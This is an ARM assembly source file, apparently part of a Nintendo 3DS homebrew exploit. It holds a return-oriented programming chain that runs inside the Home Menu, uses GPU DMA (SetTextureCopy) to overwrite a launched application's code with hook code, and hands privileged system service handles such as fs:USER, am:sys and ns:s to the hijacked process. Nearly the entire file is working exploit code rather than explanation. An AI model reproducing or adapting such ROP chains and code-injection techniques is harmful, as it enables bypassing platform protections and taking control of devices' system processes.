	.word ROP_MENU_LDR_R0R0_SVC_x32_AND_R1R0x80000000_CMP_R1x0_LDRGE_R0R4x4_POP_R4PC ; ldr r0, [r0] ; svc 0x00000032 ; and r1, r0, #-2147483648 ; cmp r1, #0 ; ldrge r0, [r4, #4] ; pop {r4, pc}
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro apt_get_appletinfo,appid
	get_cmdbuf 0
	.word ROP_MENU_POP_R4R5PC ; pop {r4, r5, r6, r7, r8, pc}
		.word 0x00060040 ; command header
		.word appid ; id
	memcpy_r0_lr_prev (4 * 2), 1, 0
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_APT_HANDLE ; r0 (apt handle)
	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
	.word ROP_MENU_LDR_R0R0_SVC_x32_AND_R1R0x80000000_CMP_R1x0_LDRGE_R0R4x4_POP_R4PC ; ldr r0, [r0] ; svc 0x00000032 ; and r1, r0, #-2147483648 ; cmp r1, #0 ; ldrge r0, [r4, #4] ; pop {r4, pc}
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro apt_finalize,appid
	get_cmdbuf 0
	.word ROP_MENU_POP_R4R5PC ; pop {r4, r5, r6, r7, r8, pc}
		.word 0x00040040 ; command header
		.word appid ; id
	memcpy_r0_lr_prev (4 * 2), 1, 0
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_APT_HANDLE ; r0 (apt handle)
	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
	.word ROP_MENU_LDR_R0R0_SVC_x32_AND_R1R0x80000000_CMP_R1x0_LDRGE_R0R4x4_POP_R4PC ; ldr r0, [r0] ; svc 0x00000032 ; and r1, r0, #-2147483648 ; cmp r1, #0 ; ldrge r0, [r4, #4] ; pop {r4, pc}
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro send_gx_cmd,cmd_data
	set_lr MENU_NOP
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_GSPGPU_INTERRUPT_RECEIVER_STRUCT+0x58 ; r0 (nn__gxlow__CTR__detail__GetInterruptReceiver)
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word cmd_data ; r1 (cmd addr)
	.word MENU_GSPGPU_GXTRYENQUEUE
.endmacro

.macro gsp_import_display_captureinfo,out_ptr
	set_lr MENU_NOP
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_GSPGPU_HANDLE ; r0 (handle ptr)
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word out_ptr ; r1 (output buffer)
	.word ROP_MENU_GSPGPU_IMPORTDISPLAYCAPTUREINFO
.endmacro

.macro mount_sdmc,name
	set_lr MENU_NOP
	.word ROP_MENU_POP_R0PC
		.word name
	.word ROP_MENU_MOUNTSDMC
.endmacro

.macro create_memory_block,out_ptr,addr,size,myperm,otherperm
	set_lr ROP_MENU_POP_R4PC
	.word ROP_MENU_POP_R0PC
		.word out_ptr
	.word ROP_MENU_POP_R1PC
		.word addr
	.word ROP_MENU_POP_R2R3R4R5R6PC
		.word size ; r2
		.word myperm ; r3
		.word 0xFFFFFFFF ; r4
		.word 0xFFFFFFFF ; r5
		.word 0xFFFFFFFF ; r6
	.word ROP_MENU_CREATEMEMORYBLOCK
		.word otherperm
.endmacro

.macro fopen,f,name,flags
	set_lr MENU_NOP
	.word ROP_MENU_POP_R0PC
		.word f
	.word ROP_MENU_POP_R1PC
		.word name
	.word ROP_MENU_POP_R2R3R4R5R6PC
		.word flags ; r2
		.word 0xFFFFFFFF ; r3
		.word 0xFFFFFFFF ; r4
		.word 0xFFFFFFFF ; r5
		.word 0xFFFFFFFF ; r6
	.word ROP_MENU_FOPEN
.endmacro

.macro fwrite,f,bytes_written,data,size,flush
	set_lr ROP_MENU_POP_R1PC
	.word ROP_MENU_POP_R0PC
		.word f
	.word ROP_MENU_POP_R1PC
		.word bytes_written ; bytes written
	.word ROP_MENU_POP_R2R3R4R5R6PC
		.word data ; r2
		.word size ; r3
		.word 0xFFFFFFFF ; r4
		.word 0xFFFFFFFF ; r5
		.word 0xFFFFFFFF ; r6
	.word ROP_MENU_FWRITE
		.word flush
.endmacro

.macro fwrite_deref,f,bytes_written,dataptr,size,flush,offset
	set_lr ROP_MENU_POP_R1PC
	load_store dataptr, @@dataptr_dst + MENU_LOADEDROP_BUFADR + offset
	.word ROP_MENU_POP_R0PC
		.word f
	.word ROP_MENU_POP_R1PC
		.word bytes_written ; bytes written
	.word ROP_MENU_POP_R2R3R4R5R6PC
		@@dataptr_dst:
		.word 0xDEADBABE ; r2
		.word size ; r3
		.word 0xFFFFFFFF ; r4
		.word 0xFFFFFFFF ; r5
		.word 0xFFFFFFFF ; r6
	.word ROP_MENU_FWRITE
		.word flush
.endmacro

.macro fseek,f,offset,origin
	set_lr ROP_MENU_POP_R1PC
	.word ROP_MENU_POP_R0PC
		.word f
	.word ROP_MENU_POP_R1PC
		.word 0x00000000 ; r1 (?)
	.word ROP_MENU_POP_R2R3R4R5R6PC
		.word offset ; r2 (offset low)
		.word 0x00000000 ; r3 (offset high)
		.word 0xFFFFFFFF ; r4
		.word 0xFFFFFFFF ; r5
		.word 0xFFFFFFFF ; r6
	.word ROP_MENU_FSEEK
		.word origin
.endmacro

.macro fclose,f
	set_lr MENU_NOP
	.word ROP_MENU_POP_R0PC
		.word f
	.word ROP_MENU_LDR_R0R0_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
	.word ROP_MENU_FCLOSE
.endmacro

.macro sleep,nanosec_low,nanosec_high
	set_lr MENU_NOP
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word nanosec_low ; r0
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word nanosec_high ; r1
	.word MENU_SLEEP
.endmacro

.macro store_r0,dst
	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
		.word dst ; r4
	.word ROP_MENU_STR_R0R4_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro store,a,dst
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word a ; r0
	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
		.word dst ; r4
	.word ROP_MENU_STR_R0R4_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro storeb,a,dst
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word a ; r0
	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
		.word dst ; r4
	.word ROP_MENU_STRB_R0R4_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro load_store,src,dst
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word src ; r0
	.word ROP_MENU_LDR_R0R0_POP_R4PC
		.word dst ; r4
	.word ROP_MENU_STR_R0R4_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro load_and_add_storeb,src,add,dst
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word src ; r0
	.word ROP_MENU_LDR_R0R0_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
	.word ROP_MENU_AND_R0R0x7_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word add ; r1
	.word ROP_MENU_ADD_R0R0R1LSL2_POP_R4PC
		.word dst ; r4
	.word ROP_MENU_STRB_R0R4_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro load_addlsl2_store,src,add,dst
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word src ; r0
	.word ROP_MENU_LDR_R0R0_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word add ; r1
	.word ROP_MENU_ADD_R0R0R1LSL2_POP_R4PC
		.word dst ; r4
	.word ROP_MENU_STR_R0R4_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro loadadr_store,src,val
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word src ; r0
	.word ROP_MENU_LDR_R0R0_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word val ; r1
	.word ROP_MENU_STR_R1R0_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro add_and_store,a,b,dst
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word a ; r0
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word b ; r1
	.word ROP_MENU_ADD_R0R0R1_POP_R4R5R6PC
		.word dst ; r4
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word ROP_MENU_STR_R0R4_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro add_and_store_3,a,b,c,dst
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word a ; r0
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word b ; r1
	.word ROP_MENU_ADD_R0R0R1_POP_R4R5R6PC
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word c ; r1
	.word ROP_MENU_ADD_R0R0R1_POP_R4R5R6PC
		.word dst ; r4
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word ROP_MENU_STR_R0R4_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro infloop
	set_lr ROP_MENU_BX_LR ; bx lr
	.word ROP_MENU_BX_LR ; bx lr
.endmacro

.include "app_code_reloc.s"

.orga 0x0

	object:
	rop: ; real ROP starts here

		; debug
			writehwreg 0x202A04, 0x01FFFFFF

		; looks like this is actually not needed
		; plug dsp handle leak
			dsp_register_interrupt_events

		; unload dsp stuff
			dsp_unload_component

		; this will be overwritten in the ropbin bkp so that it'll skip the APT title launch section
			jump_sp MENU_LOADEDROP_BUFADR + APT_TitleLaunch

		APT_TitleLaunch:

			gsp_release_right

			apt_open_session 0, 0
			apt_prepare_start_application DLPLAY_TIDLOW, 0x00040010, 0, 1
			apt_close_session 0, 0

			apt_open_session 0, 0
			apt_start_application DUMMY_PTR, 0, DUMMY_PTR, 0, 0
			apt_close_session 0, 0

			; sleep 100*1000*1000, 0x00000000

			nss_terminate_tid DLPLAY_TIDLOW, 0x00040010, 100*1000*1000
			
			sleep 1000*1000*1000, 0x00000000

			gsp_acquire_right

			apt_applet_utility_cmd2 ; includes open/close session

			; not related to title launch, just stuff we want to only do once
				mount_sdmc MENU_LOADEDROP_BUFADR + sdmc_str

				control_memory MENU_SHAREDMEMBLOCK_PTR, HB_MEM0_ADDR, 0, HB_MEM0_SIZE, 0x3, 0x3
				create_memory_block MENU_SHAREDMEMBLOCK_HANDLE, HB_MEM0_ADDR, HB_MEM0_SIZE, 0x3, 0x3

				control_memory MENU_SHAREDDSPBLOCK_PTR, HB_DSP_ADDR, 0, HB_DSP_SIZE, 0x3, 0x3
				memcpy HB_DSP_ADDR, MENU_DSP_BINARY, MENU_DSP_BINARY_SIZE, 0, 0
				create_memory_block MENU_SHAREDDSPBLOCK_HANDLE, HB_DSP_ADDR, HB_DSP_SIZE, 0x3, 0x3

				srv_get_handle MENU_LOADEDROP_BUFADR + gsplcdString, 8, MENU_GSPLCD_HANDLE

			; overwrite jump_sp APT_TitleLaunch's destination
				store MENU_LOADEDROP_BUFADR + APT_TitleLaunch_end, MENU_LOADEDROP_BKP_BUFADR + APT_TitleLaunch - 0x8 ; a = skip APT_TitleLaunch, dst = sp location

		APT_TitleLaunch_end:

		; invalidate dcache for app_code before we write to it
			invalidate_dcache MENU_OBJECT_LOC + appCode, 0x4000

		; adjust gsp commands (can't preprocess aliases)
			add_and_store_3 APP_START_LINEAR, 0xBABE0003, 0 - 0x00100000, MENU_OBJECT_LOC + gxCommandAppHook - object + 0x8
			add_and_store_3 APP_START_LINEAR, 0xBABE0007, 0 - 0x00100000, MENU_OBJECT_LOC + gxCommandAppCode - object + 0x8
			store MENU_LOADEDROP_BUFADR + appBootloader - object, MENU_OBJECT_LOC + appCode + 0x4

		; relocate app_code
			relocate

		; flush app_code because we just wrote to it and are about to DMA it
			flush_dcache MENU_OBJECT_LOC + appCode, 0x4000

		; launch app that we want to takeover
			nss_launch_title 0xBABE0004, 0xBABE0005

		; takeover app
			send_gx_cmd MENU_OBJECT_LOC + gxCommandAppHook - object
			send_gx_cmd MENU_OBJECT_LOC + gxCommandAppCode - object

		; sleep for a bit
			sleep 200*1000*1000, 0x00000000

		; release gsp rights
			gsp_release_right

		; memcpy wait loop to destination
		; do it before sending handles because bootloader overwrites the ropbin, so let's avoid a race condition !
			memcpy WAITLOOP_DST, (MENU_OBJECT_LOC+waitLoop_start-object), (waitLoop_end-waitLoop_start), 0, 0

			wait_for_parameter_and_send MENU_LOADEDROP_BUFADR + fsUserString, MENU_FS_HANDLE
			wait_for_parameter_and_send MENU_LOADEDROP_BUFADR + nssString, MENU_NSS_HANDLE
			wait_for_parameter_and_send MENU_LOADEDROP_BUFADR + irrstString, MENU_IRRST_HANDLE
			wait_for_parameter_and_send MENU_LOADEDROP_BUFADR + amsysString, MENU_AMSYS_HANDLE
			wait_for_parameter_and_send MENU_LOADEDROP_BUFADR + ptmsysmString, MENU_PTMSYSM_HANDLE
			wait_for_parameter_and_send MENU_LOADEDROP_BUFADR + gsplcdString, MENU_GSPLCD_HANDLE
			wait_for_parameter_and_send MENU_LOADEDROP_BUFADR + hbMem0String, MENU_SHAREDMEMBLOCK_HANDLE
			wait_for_parameter_and_send MENU_LOADEDROP_BUFADR + hbNdspString, MENU_SHAREDDSPBLOCK_HANDLE

		; jump to wait loop
			jump_sp WAITLOOP_DST

		; sleep for ever and ever (just in case)
			sleep 0xffffffff, 0x0fffffff

		; infinite loop (just in case)
			infloop

		; crash (just in case)
			.word 0xDEADBABE

	; copy hook code over app .text
	.align 0x4
	gxCommandAppHook:
		.word 0x00000004 ; command header (SetTextureCopy)
		.word MENU_OBJECT_LOC + appHook - object ; source address
		.word 0xDEADBABE ; destination address (standin, will be filled in)
		.word 0x00000200 ; size
		.word 0xFFFFFFFF ; dim in
		.word 0xFFFFFFFF ; dim out
		.word 0x00000008 ; flags
		.word 0x00000000 ; unused

	gxCommandAppCode:
		.word 0x00000004 ; command header (SetTextureCopy)
		.word MENU_OBJECT_LOC + appCode - object ; source address
		.word 0xDEADBABE ; destination address (standin, will be filled in)
		.word 0x00010000 ; size
		.word 0xFFFFFFFF ; dim in
		.word 0xFFFFFFFF ; dim out
		.word 0x00000008 ; flags
		.word 0x00000000 ; unused

	.align 0x4
	sharedmemAddress:
		.word 0x00000000
	sharedmemHandle:
		.word 0x00000000
	shareddspAddress:
		.word 0x00000000
	shareddspHandle:
		.word 0x00000000

	nssString:
		.ascii "ns:s"
		.byte 0x00
		.byte 0x00
		.byte 0x00
		.byte 0x00
		.byte 0x00
	fsUserString:
		.ascii "fs:USER"
		.byte 0x00
	irrstString:
		.ascii "ir:rst"
		.byte 0x00
		.byte 0x00
	amsysString:
		.ascii "am:sys"
		.byte 0x00
		.byte 0x00
	ptmsysmString:
		.ascii "ptm:sysm"
		.byte 0x00
	gsplcdString:
		.ascii "gsp::Lcd"
		.byte 0x00
	hbMem0String:
		.ascii "hb:mem0"
		.byte 0x00
	hbNdspString:
		.ascii "hb:ndsp"
		.byte 0x00

	.align 0x4
	waitForParameter_loop:
		sleep 100*1000, 0x00000000
		apt_open_session 0, 0
		apt_glance_parameter 0x101, DUMMY_PTR, 0x0, DUMMY_PTR, DUMMY_PTR, 0, 0
		; compare to 0x0 value
		.word ROP_MENU_POP_R1PC ; pop {r1, pc}
			.word 0x00000000
		.word ROP_MENU_CMP_R0R1_MVNLS_R0x0_MOVHI_R0x1_POP_R4PC ; cmp r0, r1 ; mvnls r0, #0 ; movhi r0, #1 ; pop {r4, pc}
			.word 0xDEADBABE ; r4 (garbage)
		.word ROP_MENU_POP_R4PC
			.word ROP_MENU_POP_R4R5PC ; r4
		.word ROP_MENU_POP_R0PC
			.word MENU_OBJECT_LOC + waitForParameter_loop_pivot - 4
		.word ROP_MENU_STR_R4R0x4_POP_R4PC ; strne r4, [r0, #4] ; pop {r4, pc}
			.word 0xDEADBABE ; r4 (garbage)
		apt_close_session 0, 0 ; can't close earlier because need to maintain r0 and flags
		waitForParameter_loop_memcpy:
		memcpy (MENU_LOADEDROP_BUFADR + waitForParameter_loop), (MENU_LOADEDROP_BKP_BUFADR + waitForParameter_loop), (waitForParameter_loop_memcpy-waitForParameter_loop), 1, 0
		.word ROP_MENU_POP_R4PC
			.word MENU_OBJECT_LOC + waitForParameter_loop_data + 4 ; r4 (pivot data location)
		waitForParameter_loop_pivot:
		.word ROP_MENU_STACK_PIVOT
			waitForParameter_loop_data:
			.word MENU_OBJECT_LOC + waitForParameter_loop ; sp
			.word MENU_NOP ; pc
		apt_open_session 0, 0
		.word ROP_MENU_POP_R0PC ; pop {r0, pc}
			waitForParameter_loop_handle_ptr:
			.word 0xDEADBABE ; r0
		.word ROP_MENU_LDR_R0R0_POP_R4PC ; ldr r0, [r0] ; pop {r4, pc}
			.word MENU_LOADEDROP_BUFADR + waitForParameter_loop_handle_loc ; r4 (destination address)
		.word ROP_MENU_STR_R0R4_POP_R4PC ; str r0, [r4] ; pop {r4, pc}
			.word 0xDEADBABE ; r4 (garbage)
		set_lr ROP_MENU_POP_R4R5PC
		.word ROP_MENU_POP_R0PC ; pop {r0, pc}
			.word 0x101 ; r0 (source app_id)
		.word ROP_MENU_POP_R1PC ; pop {r1, pc}
			.word 0x101 ; r1 (destination app_id)
		.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
			.word 0x00000001 ; r2 (signal type)
			waitForParameter_loop_buffer_ptr:
			.word 0xDEADBABE ; r3 (parameter buffer ptr)
			.word 0xDEADBABE ; r4 (garbage)
			.word 0xDEADBABE ; r5 (garbage)
			.word 0xDEADBABE ; r6 (garbage)
		.word ROP_MENU_APT_SENDPARAMETER
			.word 0x8 ; arg_0 (parameter buffer size) (r4 (garbage))
			waitForParameter_loop_handle_loc:
			.word 0xDEADBABE ; arg_4 (handle passed to dst) (will be overwritten by dereferenced handle_ptr) (r5 (garbage))
		apt_close_session 0, 0
		waitForParameter_loop_memcpy2:
		memcpy (MENU_LOADEDROP_BUFADR + waitForParameter_loop), (MENU_LOADEDROP_BKP_BUFADR + waitForParameter_loop), (waitForParameter_loop_memcpy2-waitForParameter_loop), 1, 0
		.word ROP_MENU_POP_R4PC
			.word MENU_OBJECT_LOC + waitForParameter_loop_data2 + 4 ; r4 (pivot data location)
		.word ROP_MENU_STACK_PIVOT
			waitForParameter_loop_data2:
			waitForParameter_loop_retsp:
			.word 0xDEAD0000 ; will be overwritten (sp)
			.word MENU_NOP ; pc
			.ascii "end"

	.align 0x4
	waitLoop_start:
		.word ROP_MENU_POP_R4R5PC
		waitLoop_pivot_data:
			.word WAITLOOP_DST + waitLoop - waitLoop_start ; sp
			.word MENU_NOP ; pc
		waitLoop:
			sleep 500*1000*1000, 0x00000000

			; check keycombo
			cond_jump_sp MENU_LOADEDROP_BUFADR + waitLoop_keycomboend + WAITLOOP_OFFSET, 0x1000001C, 0x300 ; L+R (TEMP)

				nss_terminate_tid_deref MENU_LOADEDROP_BUFADR + WAITLOOP_OFFSET + waitLoop_tidlow, MENU_LOADEDROP_BUFADR + WAITLOOP_OFFSET + waitLoop_tidhigh, 1000*1000*1000, WAITLOOP_OFFSET

				sleep 1000*1000*1000, 0x00000000

				apt_open_session 0, WAITLOOP_OFFSET
				apt_finalize 0x300
				apt_close_session 0, WAITLOOP_OFFSET

				load_store MENU_LOADEDROP_BUFADR + WAITLOOP_OFFSET + waitLoop_marker + 4, MENU_LOADEDROP_BUFADR + WAITLOOP_OFFSET + waitLoop_marker - 4

			waitLoop_keycomboend:

			apt_open_session 1, WAITLOOP_OFFSET
			apt_inquire_notification 0x101, MENU_LOADEDROP_BUFADR + notificationType, 1, WAITLOOP_OFFSET
			store_r0 MENU_LOADEDROP_BUFADR + notificationError
			apt_close_session 1, WAITLOOP_OFFSET

			; first check for error
			cond_jump_sp MENU_LOADEDROP_BUFADR + waitLoop_notificationend + WAITLOOP_OFFSET, MENU_LOADEDROP_BUFADR + notificationError, 0x0

				; power button pressed notification type
				cond_jump_sp MENU_LOADEDROP_BUFADR + waitLoop_powerend + WAITLOOP_OFFSET, MENU_LOADEDROP_BUFADR + notificationType, 0x8

					apt_open_session 0, WAITLOOP_OFFSET
					apt_hardware_reboot_async
					apt_close_session 0, WAITLOOP_OFFSET
					
					jump_sp MENU_LOADEDROP_BUFADR + waitLoop_startsleep_memcpy + WAITLOOP_OFFSET

				waitLoop_powerend:

				; preparing for sleep mode notification type
				cond_jump_sp MENU_LOADEDROP_BUFADR + waitLoop_preparesleepend + WAITLOOP_OFFSET, MENU_LOADEDROP_BUFADR + notificationType, 0x3

					apt_open_session 0, WAITLOOP_OFFSET
					apt_reply_sleepquery 0x101, 0x1
					apt_close_session 0, WAITLOOP_OFFSET

					jump_sp MENU_LOADEDROP_BUFADR + waitLoop_startsleep_memcpy + WAITLOOP_OFFSET

				waitLoop_preparesleepend:

				; starting sleep mode notification type
				cond_jump_sp MENU_LOADEDROP_BUFADR + waitLoop_startsleepend + WAITLOOP_OFFSET, MENU_LOADEDROP_BUFADR + notificationType, 0x5

					apt_open_session 0, WAITLOOP_OFFSET
					apt_reply_sleepnotification_complete 0x101
					apt_close_session 0, WAITLOOP_OFFSET

					; memcpy wait loop to restore what we just destroyed by calling functions (oops !)
					; only copy whatever's before the memcpy so we dont overwrite the return address
					waitLoop_startsleep_memcpy:
					memcpy WAITLOOP_DST, (MENU_OBJECT_LOC+waitLoop_start-object), (waitLoop_startsleep_memcpy-waitLoop_start), 1, WAITLOOP_OFFSET

				waitLoop_startsleepend:

			waitLoop_notificationend:

			apt_open_session 1, WAITLOOP_OFFSET
			apt_glance_parameter 0x101, DUMMY_PTR, 0x0, MENU_LOADEDROP_BUFADR + paramType, DUMMY_PTR, 1, WAITLOOP_OFFSET
			store_r0 MENU_LOADEDROP_BUFADR + paramError
			apt_close_session 1, WAITLOOP_OFFSET

			; first check for error
			cond_jump_sp MENU_LOADEDROP_BUFADR + waitLoop_paramend + WAITLOOP_OFFSET, MENU_LOADEDROP_BUFADR + paramError, 0x0

				; ret-to-menu notification type
				cond_jump_sp MENU_LOADEDROP_BUFADR + waitLoop_retmenuend + WAITLOOP_OFFSET, MENU_LOADEDROP_BUFADR + paramType, 0xB

					apt_open_session 0, WAITLOOP_OFFSET
					apt_receive_parameter 0x101, DUMMY_PTR, 0x0, MENU_LOADEDROP_BUFADR + paramType, DUMMY_PTR, 0, WAITLOOP_OFFSET
					apt_close_session 0, WAITLOOP_OFFSET

					gsp_import_display_captureinfo MENU_LOADEDROP_BUFADR + displayCapture

					; allocate buffer where we'll put all the stuff
					control_memory MENU_LOADEDROP_BUFADR + linearMem, 0, 0, 0x47000, 0x10003, 0x3

					gsp_acquire_right

					; open file, seek EOF
					fopen MENU_SCREENSHOTS_FILEOBJECT, MENU_LOADEDROP_BUFADR + screenshots_filename, 0x7
					fseek MENU_SCREENSHOTS_FILEOBJECT, 0x0, 0x2

					; top screen left
						load_store MENU_LOADEDROP_BUFADR + displayCapture, MENU_LOADEDROP_BUFADR + gxCommandFramebufferTopSource
						load_addlsl2_store MENU_LOADEDROP_BUFADR + linearMem, 0x80, MENU_LOADEDROP_BUFADR + gxCommandFramebufferTopDestination

						send_gx_cmd MENU_LOADEDROP_BUFADR + gxCommandFramebufferTop

						sleep 100*1000*1000, 0x00000000

						; write magic number
						loadadr_store MENU_LOADEDROP_BUFADR + linearMem, 0x30524353

						fwrite_deref MENU_SCREENSHOTS_FILEOBJECT, DUMMY_PTR, MENU_LOADEDROP_BUFADR + linearMem, 0x47000, 0x1, WAITLOOP_OFFSET

					; top screen right
						load_store MENU_LOADEDROP_BUFADR + displayCapture + 0x4, MENU_LOADEDROP_BUFADR + gxCommandFramebufferTopSource
						load_addlsl2_store MENU_LOADEDROP_BUFADR + linearMem, 0x80, MENU_LOADEDROP_BUFADR + gxCommandFramebufferTopDestination

						send_gx_cmd MENU_LOADEDROP_BUFADR + gxCommandFramebufferTop

						sleep 100*1000*1000, 0x00000000

						; write magic number
						loadadr_store MENU_LOADEDROP_BUFADR + linearMem, 0x31524353

						fwrite_deref MENU_SCREENSHOTS_FILEOBJECT, DUMMY_PTR, MENU_LOADEDROP_BUFADR + linearMem, 0x47000, 0x1, WAITLOOP_OFFSET

					; sub screen
						load_store MENU_LOADEDROP_BUFADR + displayCapture + 0x10, MENU_LOADEDROP_BUFADR + gxCommandFramebufferTopSource
						load_addlsl2_store MENU_LOADEDROP_BUFADR + linearMem, 0x80, MENU_LOADEDROP_BUFADR + gxCommandFramebufferTopDestination

						send_gx_cmd MENU_LOADEDROP_BUFADR + gxCommandFramebufferTop

						sleep 100*1000*1000, 0x00000000

						; write magic number
						loadadr_store MENU_LOADEDROP_BUFADR + linearMem, 0x32524353

						fwrite_deref MENU_SCREENSHOTS_FILEOBJECT, DUMMY_PTR, MENU_LOADEDROP_BUFADR + linearMem, 0x47000, 0x1, WAITLOOP_OFFSET

					; close file
					fclose MENU_SCREENSHOTS_FILEOBJECT

					gsp_release_right

					; deallocate linear buffer
					free_memory_deref MENU_LOADEDROP_BUFADR + linearMem, 0x47000

					apt_clear_homebutton_state

					apt_open_session 0, WAITLOOP_OFFSET
					apt_reply_sleepquery 0x101, 0x0
					apt_close_session 0, WAITLOOP_OFFSET

					; reply to APT return-to-menu stuff
					; (no need for skips because we just did a fresh memcpy)
					apt_open_session 0, WAITLOOP_OFFSET
					apt_prepare_leave_homemenu 0, WAITLOOP_OFFSET
					apt_close_session 0, WAITLOOP_OFFSET

					apt_open_session 0, WAITLOOP_OFFSET
					apt_leave_homemenu 0, WAITLOOP_OFFSET
					apt_close_session 0, WAITLOOP_OFFSET

					; memcpy wait loop to restore what we just destroyed by calling functions (oops !)
					; only copy whatever's before the memcpy so we dont overwrite the return address
					waitLoop_retmenu_memcpy:
					memcpy WAITLOOP_DST, (MENU_OBJECT_LOC+waitLoop_start-object), (waitLoop_retmenu_memcpy-waitLoop_start), 1, WAITLOOP_OFFSET

				waitLoop_retmenuend:

			waitLoop_paramend:

			apt_open_session 1, WAITLOOP_OFFSET
			apt_is_registered 0x300, MENU_LOADEDROP_BUFADR + curAppRegistered, 1, WAITLOOP_OFFSET
			apt_close_session 1, WAITLOOP_OFFSET

			cond_jump_sp MENU_LOADEDROP_BUFADR + waitLoop_isregisteredend + WAITLOOP_OFFSET, MENU_LOADEDROP_BUFADR + curAppRegistered, 0x1
			cond_jump_sp MENU_LOADEDROP_BUFADR + waitLoop_isregisteredend + WAITLOOP_OFFSET, MENU_LOADEDROP_BUFADR + oldAppRegistered, 0x0

			; only get here if app was just registered
				apt_open_session 0, WAITLOOP_OFFSET
				apt_prepare_jump_application
				apt_close_session 0, WAITLOOP_OFFSET

				apt_open_session 0, WAITLOOP_OFFSET
				apt_jump_application
				apt_close_session 0, WAITLOOP_OFFSET

				; memcpy wait loop to restore what we just destroyed by calling functions (oops !)
				; only copy whatever's before the memcpy so we dont overwrite the return address
				waitLoop_isregistered_memcpy:
				memcpy WAITLOOP_DST, (MENU_OBJECT_LOC+waitLoop_start-object), (waitLoop_isregistered_memcpy-waitLoop_start), 1, WAITLOOP_OFFSET

			waitLoop_isregisteredend:
			load_store MENU_LOADEDROP_BUFADR + curAppRegistered, MENU_LOADEDROP_BUFADR + oldAppRegistered

			.word ROP_MENU_POP_R4PC ; pop {r4, pc}
				.word WAITLOOP_DST + waitLoop_pivot_data - waitLoop_start + 4 ; r4
			.word ROP_MENU_STACK_PIVOT
				waitLoop_marker:
				.word 0xBABEBAD0 ; marker
				.word ROP_MENU_POP_R4R5R6R7R8PC ; rop gadget to replace pivot with
				waitLoop_tidlow:
				.word 0xBABE0004 ; tid_low
				waitLoop_tidhigh:
				.word 0xBABE0005 ; tid_high
				.word 0xDEADBABE
			gsp_acquire_right
			writehwreg 0x202A04, 0x01FF00FF
			; todo : add cache invalidation for ropbin
			sleep 100*1000*1000, 0x00000000
	waitLoop_end:

	.align 0x4
	notificationError:
		.word 0x00000000
	notificationType:
		.word 0x00000000
	paramType:
		.word 0x00000000
	paramError:
		.word 0x00000000

	.align 0x4
	linearMem:
		.word 0x00000000
	
	.align 0x4
	gxCommandFramebufferTop:
		.word 0x00000004 ; command header (TextureCopy)
		gxCommandFramebufferTopSource:
		.word 0xDEADBABE ; source address
		gxCommandFramebufferTopDestination:
		.word 0xDEADBABE ; destination address
		.word 0x00046500 + 0x200 ; size
		.word 0x00000000 ; dim in
		.word 0x00000000 ; dim out
		.word 0x00000008 ; flags
		.word 0x00000000 ; unused

	sdmc_str:
		.ascii "sdmc:"
		.word 0x00
	screenshots_filename:
		.string "sdmc:/screenshots_raw.bin"
		.byte 0x00, 0x00
	.align 0x4
	screenshots_obj:
		.word 0x00000000
		.word 0x00000000
		.word 0x00000000
		.word 0x00000000
		.word 0x00000000
	oldAppRegistered:
		.word 0x00000001
	curAppRegistered:
		.word 0x00000000

	.align 0x4
	displayCapture:
		.fill ((displayCapture + 0x20) - .), 0xDA
	displayCaptureEnd:

	.align 0x20
	appHook:
		.arm
			nop
